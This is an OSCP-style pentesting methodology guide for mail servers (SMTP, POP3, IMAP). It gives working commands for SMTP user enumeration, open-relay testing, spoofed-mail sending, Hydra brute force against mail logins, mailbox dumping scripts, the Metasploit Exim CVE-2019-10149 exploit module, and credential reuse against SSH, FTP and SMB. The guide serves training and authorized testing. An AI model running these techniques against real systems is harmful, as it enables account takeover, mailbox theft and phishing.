# Mail Servers — SMTP, POP3, IMAP 

> **Scope:** Full mail protocol methodology — SMTP (25/465/587), POP3 (110/995), IMAP (143/993). Port discovery, enumeration, user enumeration (VRFY/EXPN/RCPT TO), credential attacks, mailbox access, known CVEs, and chaining mail findings into broader compromise. Written for OSCP: you see mail ports open, you drain every bit of value from them.

---

## Table of Contents

1. [Mail Protocols — Concept Overview](#1-mail-protocols--concept-overview)
   - 1.1 The Three Protocols and Their Roles
   - 1.2 Ports Reference
   - 1.3 Why Mail Servers Matter in Pentesting

2. [SMTP (Port 25/465/587)](#2-smtp-port-2546558​7)
   - 2.1 What is SMTP
   - 2.2 Port Discovery
   - 2.3 Banner Grabbing & Version Enumeration
   - 2.4 SMTP User Enumeration — VRFY
   - 2.5 SMTP User Enumeration — EXPN
   - 2.6 SMTP User Enumeration — RCPT TO
   - 2.7 Automated SMTP User Enum Tools
   - 2.8 Open Relay Testing
   - 2.9 SMTP Credential Brute Force
   - 2.10 Sending Spoofed/Test Mail Manually

3. [POP3 (Port 110/995)](#3-pop3-port-110995)
   - 3.1 What is POP3
   - 3.2 Port Discovery
   - 3.3 Manual POP3 Session
   - 3.4 POP3 Credential Brute Force
   - 3.5 Reading Mailbox Contents

4. [IMAP (Port 143/993)](#4-imap-port-143993)
   - 4.1 What is IMAP
   - 4.2 Port Discovery
   - 4.3 Manual IMAP Session
   - 4.4 IMAP Credential Brute Force
   - 4.5 Browsing Folders & Reading Mail

5. [Known Vulnerabilities & CVEs](#5-known-vulnerabilities--cves)

6. [Metasploit Modules — All Three Protocols](#6-metasploit-modules--all-three-protocols)

7. [Chaining Mail Findings to Further Compromise](#7-chaining-mail-findings-to-further-compromise)

8. [Full Attack Walkthrough](#8-full-attack-walkthrough)

9. [Quick Reference Card](#9-quick-reference-card)

---

## 1. Mail Protocols — Concept Overview

### 1.1 The Three Protocols and Their Roles

```
SENDING mail  →  SMTP (Simple Mail Transfer Protocol)
RETRIEVING mail (download & delete) → POP3 (Post Office Protocol v3)
RETRIEVING mail (sync, stays on server) → IMAP (Internet Message Access Protocol)
```

- **SMTP** is used to *send* mail — client to server, and server to server. It's also frequently used (intentionally or via misconfiguration) for **username enumeration** because of how it validates recipients.
- **POP3** downloads mail to a single client and (by default) deletes it from the server — older, simpler.
- **IMAP** keeps mail synced on the server across multiple devices — more common in modern setups.

### 1.2 Ports Reference

| Port | Protocol | Encryption |
|---|---|---|
| **25** | SMTP | Plaintext (default) |
| **465** | SMTP over SSL (SMTPS, legacy) | Encrypted |
| **587** | SMTP with STARTTLS (submission) | Encrypted (upgraded) |
| **110** | POP3 | Plaintext (default) |
| **995** | POP3 over SSL (POP3S) | Encrypted |
| **143** | IMAP | Plaintext (default) |
| **993** | IMAP over SSL (IMAPS) | Encrypted |

```bash
# Quick check for all mail ports at once
nmap -p 25,110,143,465,587,993,995 <TARGET_IP>
```

### 1.3 Why Mail Servers Matter in Pentesting

- **Username enumeration** via SMTP is one of the most reliable, classic OSCP techniques — confirms real accounts that exist on the system, feeding into every other brute force/spray attack
- Mail servers are frequently **open relays** — letting you send spoofed mail (useful for phishing-style engagements, or simply confirming misconfiguration)
- POP3/IMAP give you **direct access to mailbox contents** once you have credentials — emails often contain passwords, reset links, internal info, attachments with sensitive data
- Mail server software (Exim, Postfix, Dovecot, etc.) has its own history of **critical RCE vulnerabilities**
- Credentials found via mail (or used to access mail) frequently **reuse across SSH, FTP, and web logins** on the same box

---

## 2. SMTP (Port 25/465/587)

### 2.1 What is SMTP

SMTP handles mail transmission between servers and from clients submitting mail. Common server software: **Postfix, Exim, Sendmail, Microsoft Exchange**.

### 2.2 Port Discovery

```bash
# Basic scan
nmap -p 25,465,587 <TARGET_IP>

# Version detection — CRITICAL, tells you exact software/version
nmap -sV -p 25,465,587 <TARGET_IP>

# Full script scan
nmap -sV -sC -p 25 <TARGET_IP>

# All SMTP nmap scripts
nmap -p 25 --script "smtp-*" <TARGET_IP>
```

### 2.3 Banner Grabbing & Version Enumeration

```bash
# Netcat banner grab — SMTP announces itself immediately on connect
nc -nv <TARGET_IP> 25

# Example banner:
# 220 mail.example.com ESMTP Postfix (Ubuntu)

# Telnet works too
telnet <TARGET_IP> 25

# Nmap version + banner script
nmap -sV -p 25 --script banner <TARGET_IP>

# Get supported commands/extensions
nc -nv <TARGET_IP> 25
EHLO test
# Lists: STARTTLS, AUTH mechanisms, PIPELINING, SIZE limits, etc.
```

### 2.4 SMTP User Enumeration — VRFY

`VRFY` asks the server to verify if a username/mailbox exists — a direct yes/no oracle when enabled.

```bash
# Manual via netcat
nc -nv <TARGET_IP> 25
VRFY root
VRFY admin
VRFY nonexistentuser123

# Valid response: 250 root <root@example.com>
# Invalid response: 550 No such user

# Scripted loop
for user in root admin administrator www-data ftp test guest backup; do
    echo -e "VRFY $user\r\nQUIT\r\n" | nc -w2 <TARGET_IP> 25
    echo "---"
done
```

### 2.5 SMTP User Enumeration — EXPN

`EXPN` expands a mailing list/alias to show its real member addresses — also leaks valid usernames where enabled.

```bash
nc -nv <TARGET_IP> 25
EXPN root
EXPN admin
EXPN postmaster

# Valid: 250 John Smith <jsmith@example.com>
# Invalid: 550 Access denied / 252 Cannot VRFY
```

### 2.6 SMTP User Enumeration — RCPT TO

When `VRFY`/`EXPN` are disabled (common hardening), `RCPT TO` during an actual mail transaction often still leaks whether a mailbox exists, because the server has to decide whether to accept the recipient.

```bash
nc -nv <TARGET_IP> 25
HELO test.com
MAIL FROM: test@test.com
RCPT TO: root@example.com
# 250 OK = valid user
# 550 No such user = invalid

RCPT TO: nonexistent@example.com
# 550 = confirms invalid

QUIT
```

```bash
# Scripted RCPT TO enumeration loop
for user in root admin charix backup ftp test; do
    echo -e "HELO test.com\r\nMAIL FROM: test@test.com\r\nRCPT TO: $user@example.com\r\nQUIT\r\n" | nc -w2 <TARGET_IP> 25 | grep -E "^25|^55"
    echo "Checked: $user"
done
```

### 2.7 Automated SMTP User Enum Tools

```bash
# smtp-user-enum — the dedicated classic tool
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t <TARGET_IP>
smtp-user-enum -M EXPN -U userlist.txt -t <TARGET_IP>
smtp-user-enum -M RCPT -U userlist.txt -t <TARGET_IP>

# With specific port
smtp-user-enum -M VRFY -U userlist.txt -t <TARGET_IP> -p 587

# Metasploit
msfconsole
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS <TARGET_IP>
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
run

# Nmap script
nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} <TARGET_IP>
```

### 2.8 Open Relay Testing

An **open relay** lets anyone send mail through the server to any destination — a misconfiguration that enables spam/phishing abuse and confirms weak server hardening.

```bash
# Nmap check
nmap -p 25 --script smtp-open-relay <TARGET_IP>

# Manual test
nc -nv <TARGET_IP> 25
HELO test.com
MAIL FROM: test@external.com
RCPT TO: victim@anotherexternaldomain.com
DATA
Subject: relay test
This is a relay test.
.
QUIT

# If accepted (250 OK at each step, mail goes through) → OPEN RELAY confirmed
```

### 2.9 SMTP Credential Brute Force

If SMTP requires AUTH (common on submission port 587):

```bash
# Hydra
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -s 587 <TARGET_IP> smtp

# With specific AUTH mechanism
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> smtp -s 25

# Medusa
medusa -h <TARGET_IP> -u admin -P /usr/share/wordlists/rockyou.txt -M smtp
```

### 2.10 Sending Spoofed/Test Mail Manually

Useful to confirm relay behavior, or for engagement scenarios involving phishing simulation (only within authorized scope).

```bash
nc -nv <TARGET_IP> 25
HELO attacker.com
MAIL FROM: ceo@example.com
RCPT TO: employee@example.com
DATA
Subject: Test
From: CEO <ceo@example.com>
To: employee@example.com

This is a test email body.
.
QUIT

# swaks — purpose-built SMTP testing tool, much more convenient
sudo apt install swaks
swaks --to victim@example.com --from spoofed@example.com --server <TARGET_IP>
swaks --to victim@example.com --from spoofed@example.com --server <TARGET_IP> --body "Test message" --header "Subject: Test"
```

---

## 3. POP3 (Port 110/995)

### 3.1 What is POP3

POP3 retrieves mail from a server to a single client, typically removing it from the server afterward. Common server software: **Dovecot, Courier, Cyrus**.

### 3.2 Port Discovery

```bash
nmap -p 110,995 <TARGET_IP>
nmap -sV -p 110,995 <TARGET_IP>
nmap -p 110 --script "pop3-*" <TARGET_IP>

# Banner grab
nc -nv <TARGET_IP> 110
# +OK POP3 server ready
```

### 3.3 Manual POP3 Session

```bash
nc -nv <TARGET_IP> 110

USER charix
PASS password123
# +OK Logged in

STAT
# +OK 5 12000     (5 messages, 12000 bytes total)

LIST
# +OK 5 messages
# 1 2500
# 2 1800
# ...

RETR 1
# Retrieves and displays the full content of message 1

DELE 1
# Marks message 1 for deletion

QUIT
# Commits deletions and closes
```

### 3.4 POP3 Credential Brute Force

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <TARGET_IP> pop3
hydra -l charix -P /usr/share/wordlists/rockyou.txt <TARGET_IP> pop3

# Metasploit
msfconsole
use auxiliary/scanner/pop3/pop3_login
set RHOSTS <TARGET_IP>
set USER_FILE users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### 3.5 Reading Mailbox Contents

```bash
# After successful login, dump every message
nc -nv <TARGET_IP> 110 << 'EOF'
USER charix
PASS password123
LIST
RETR 1
RETR 2
RETR 3
QUIT
EOF

# Or use curl
curl -k "pop3://<TARGET_IP>" --user charix:password123

# Search retrieved emails for credentials/sensitive info
# (save the full session output to a file first)
nc <TARGET_IP> 110 < pop3_commands.txt > mailbox_dump.txt
grep -i "password\|secret\|confidential" mailbox_dump.txt
```

---

## 4. IMAP (Port 143/993)

### 4.1 What is IMAP

IMAP keeps mail synchronized on the server, allowing multiple clients/folders. Common server software: **Dovecot, Courier**.

### 4.2 Port Discovery

```bash
nmap -p 143,993 <TARGET_IP>
nmap -sV -p 143,993 <TARGET_IP>
nmap -p 143 --script "imap-*" <TARGET_IP>

# Banner grab
nc -nv <TARGET_IP> 143
# * OK IMAP4rev1 Server Ready
```

### 4.3 Manual IMAP Session

IMAP requires a "tag" prefix on every command (any short string you choose, e.g. `a1`, `01`).

```bash
nc -nv <TARGET_IP> 143

a1 LOGIN charix password123
# a1 OK LOGIN completed

a2 LIST "" "*"
# Lists all folders/mailboxes

a3 SELECT INBOX
# a3 OK [READ-WRITE] SELECT completed
# Also returns message count

a4 FETCH 1 BODY[]
# Retrieves full content of message 1

a5 FETCH 1:5 BODY[]
# Retrieves messages 1 through 5

a6 LOGOUT
```

### 4.4 IMAP Credential Brute Force

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <TARGET_IP> imap
hydra -l charix -P /usr/share/wordlists/rockyou.txt <TARGET_IP> imap

# Metasploit
msfconsole
use auxiliary/scanner/imap/imap_login
set RHOSTS <TARGET_IP>
set USER_FILE users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### 4.5 Browsing Folders & Reading Mail

```bash
# curl supports IMAP directly — much easier than raw netcat
curl -k "imap://<TARGET_IP>" --user charix:password123

# List folders
curl -k "imap://<TARGET_IP>/" --user charix:password123

# Select INBOX and list messages
curl -k "imap://<TARGET_IP>/INBOX" --user charix:password123

# Fetch a specific message
curl -k "imap://<TARGET_IP>/INBOX;UID=1" --user charix:password123

# Python imaplib for full mailbox dump
python3 << 'EOF'
import imaplib
mail = imaplib.IMAP4("<TARGET_IP>")
mail.login("charix", "password123")
mail.select("inbox")
typ, data = mail.search(None, "ALL")
for num in data[0].split():
    typ, msg_data = mail.fetch(num, "(RFC822)")
    print(msg_data[0][1].decode(errors="ignore"))
    print("---")
mail.logout()
EOF
```

---

## 5. Known Vulnerabilities & CVEs

| Software | CVE / Issue | Description |
|---|---|---|
| **Exim** | CVE-2019-10149 ("Return of the WIZard") | Remote command execution via crafted recipient address — very common OSCP target |
| **Exim** | CVE-2018-6789 | Buffer overflow in base64 decoding, pre-auth RCE |
| Sendmail | CVE-1999-0096 (and many historic ones) | Old but still appears in legacy labs |
| Dovecot | Various auth bypass issues over the years | Check version-specific advisories |
| Postfix | Generally well-hardened; check config more than CVEs (open relay, weak auth) | — |
| Microsoft Exchange | ProxyLogon (CVE-2021-26855), ProxyShell | Major real-world RCE chains (web-based, not raw SMTP port) |

```bash
# Always check exact version first
nmap -sV -p 25 <TARGET_IP>
# 25/tcp open smtp Exim smtpd 4.87

searchsploit exim
searchsploit sendmail
searchsploit postfix
searchsploit dovecot
```

**CVE-2019-10149 (Exim) — reference only, version-gated:**
```bash
# Confirm version is in vulnerable range (4.87 - 4.91) before attempting
nmap -sV -p 25 <TARGET_IP>

# Metasploit has a module for this — the standard, version-checked path
msfconsole
search exim
use exploit/linux/smtp/exim4_dovecot_exec
set RHOSTS <TARGET_IP>
run
```

---

## 6. Metasploit Modules — All Three Protocols

```bash
msfconsole

# === SMTP ===
use auxiliary/scanner/smtp/smtp_version
use auxiliary/scanner/smtp/smtp_enum
use auxiliary/scanner/smtp/smtp_relay
use exploit/linux/smtp/exim4_dovecot_exec

# === POP3 ===
use auxiliary/scanner/pop3/pop3_login
use auxiliary/scanner/pop3/pop3_version

# === IMAP ===
use auxiliary/scanner/imap/imap_login
use auxiliary/scanner/imap/imap_version

# Generic usage pattern for any of these
set RHOSTS <TARGET_IP>
set USER_FILE users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

---

## 7. Chaining Mail Findings to Further Compromise

```bash
# Usernames found via VRFY/EXPN/RCPT → feed into SSH/FTP/SMB brute force
hydra -L smtp_users.txt -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>

# Credentials that work for POP3/IMAP → try the SAME creds elsewhere
ssh charix@<TARGET_IP>          # same username/password reused?
ftp <TARGET_IP>                  # same creds?
smbclient -L //<TARGET_IP> -U charix

# Mail content itself often contains:
# - Password reset emails with tokens
# - Internal URLs/hostnames not otherwise discoverable
# - Attachments (configs, spreadsheets, documents) with embedded credentials
# - Other employees' names → more usernames to enumerate elsewhere

# Search dumped mailbox content for anything useful
grep -i "password\|reset\|confidential\|internal" mailbox_dump.txt
grep -oE "https?://[^ ]+" mailbox_dump.txt    # extract any URLs mentioned
```

---

## 8. Full Attack Walkthrough

**Scenario:** Nmap shows 25 (SMTP), 110 (POP3) open.

**Step 1 — Discover and fingerprint:**
```bash
nmap -sV -p 25,110 <TARGET_IP>
# 25/tcp  open smtp Exim smtpd 4.89
# 110/tcp open pop3 Dovecot pop3d
```

**Step 2 — Enumerate users via SMTP:**
```bash
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t <TARGET_IP>
# Found: root, charix, backup
```

**Step 3 — Confirm with RCPT TO (in case VRFY is later patched/disabled):**
```bash
for user in root charix backup; do
    echo -e "HELO test\r\nMAIL FROM: a@a.com\r\nRCPT TO: $user@localhost\r\nQUIT\r\n" | nc -w2 <TARGET_IP> 25
done
```

**Step 4 — Brute force POP3 with found usernames:**
```bash
hydra -L found_users.txt -P /usr/share/wordlists/rockyou.txt <TARGET_IP> pop3
# [110][pop3] host: <TARGET_IP>  login: charix  password: charix123
```

**Step 5 — Read the mailbox:**
```bash
nc -nv <TARGET_IP> 110
USER charix
PASS charix123
LIST
RETR 1
# Email contains: "Your SSH password has been reset to: Charix@2024!"
```

**Step 6 — Reuse the credential found in the email:**
```bash
ssh charix@<TARGET_IP>
# password: Charix@2024!
# Login successful ✅
```

**Step 7 — Post-access:**
```bash
cat ~/user.txt
sudo -l
```

---

## 9. Quick Reference Card

```
====================================================================
 MAIL SERVERS (SMTP / POP3 / IMAP) — OSCP QUICK REFERENCE
====================================================================

[PORTS]
  SMTP:  25 (plain), 465 (SSL), 587 (STARTTLS/submission)
  POP3:  110 (plain), 995 (SSL)
  IMAP:  143 (plain), 993 (SSL)

[DISCOVERY — ALL AT ONCE]
  nmap -sV -sC -p 25,110,143,465,587,993,995 <TARGET_IP>

--------------------------------------------------------------------
[SMTP USER ENUMERATION]
  smtp-user-enum -M VRFY -U userlist.txt -t <TARGET_IP>
  smtp-user-enum -M EXPN -U userlist.txt -t <TARGET_IP>
  smtp-user-enum -M RCPT -U userlist.txt -t <TARGET_IP>

  Manual:
  nc <TARGET_IP> 25
  VRFY root
  EXPN admin
  (HELO/MAIL FROM/RCPT TO sequence for RCPT method)

[SMTP OPEN RELAY CHECK]
  nmap -p 25 --script smtp-open-relay <TARGET_IP>

[SMTP BRUTE FORCE]
  hydra -L users.txt -P rockyou.txt -s 587 <TARGET_IP> smtp

[SMTP SEND TEST MAIL]
  swaks --to victim@x.com --from spoof@x.com --server <TARGET_IP>

--------------------------------------------------------------------
[POP3 MANUAL SESSION]
  nc <TARGET_IP> 110
  USER name
  PASS password
  LIST
  RETR 1
  QUIT

[POP3 BRUTE FORCE]
  hydra -L users.txt -P rockyou.txt <TARGET_IP> pop3
  msf: use auxiliary/scanner/pop3/pop3_login

--------------------------------------------------------------------
[IMAP MANUAL SESSION]
  nc <TARGET_IP> 143
  a1 LOGIN name password
  a2 LIST "" "*"
  a3 SELECT INBOX
  a4 FETCH 1 BODY[]
  a5 LOGOUT

[IMAP BRUTE FORCE]
  hydra -L users.txt -P rockyou.txt <TARGET_IP> imap
  msf: use auxiliary/scanner/imap/imap_login

[IMAP EASY DUMP]
  curl -k "imap://<TARGET_IP>/INBOX" --user name:password

--------------------------------------------------------------------
[KEY CVE — VERSION GATED]
  Exim 4.87-4.91 → CVE-2019-10149
  msf: use exploit/linux/smtp/exim4_dovecot_exec

[CHAIN FOUND CREDS/USERS EVERYWHERE]
  hydra -L smtp_users.txt -P rockyou.txt ssh://<TARGET_IP>
  ssh foundcreds@<TARGET_IP>
  ftp <TARGET_IP>
  smbclient -L //<TARGET_IP> -U founduser

[KEY TAKEAWAY]
  SMTP user enum (VRFY/EXPN/RCPT) → builds your username list.
  POP3/IMAP creds → direct mailbox access, often LEAKS more creds
  in the email bodies themselves. Always reuse found creds everywhere.
====================================================================
```

---

*This document is for authorized penetration testing, OSCP exam preparation, and CTF competitions only. Always obtain written permission before testing systems you do not own.*
